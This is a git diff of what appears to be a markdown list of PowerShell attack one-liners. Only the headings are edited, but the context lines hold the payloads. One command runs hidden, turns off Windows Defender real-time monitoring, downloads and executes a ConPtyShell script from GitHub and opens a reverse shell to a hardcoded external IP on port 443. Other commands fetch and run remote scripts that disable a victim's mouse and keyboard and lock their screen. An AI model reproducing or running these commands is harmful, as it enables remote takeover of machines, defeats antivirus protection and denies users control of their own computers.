@@ -45,11 +45,11 @@ powershell -w hidden {IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConP
 ```
 powershell -w hidden {Set-MpPreference -DisableRealtimeMonitoring $true; Start-Sleep -millisecond 1500; IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 40.71.97.253 443}
 ```
-### Disable Mouse/Keyboard Input (with Text) - Change 4 to something Longer if you Wish
+### Disable Mouse/Keyboard Input (Cant Seem to Disable TrackPad :/ input)- Change 4 to something Longer if you Wish
 ```
 IEX(IWR https://raw.githubusercontent.com/OPstriker/PS-Script-s/main/Dis-Input.ps1 -UseBasicParsing); Disable-UserInput -seconds 4 | Out-Null
 ```
-WithoutText-
+### Working ScreenLock, Locks Your Screen and Prevents user Interaction For a Specific Time (Change 4 to something Else)
 ```
 IEX(IWR https://raw.githubusercontent.com/OPstriker/PS-Script-s/main/screen-lock-test.ps1 -UseBasicParsing); Lock-Screen -LockSeconds 4
 ```
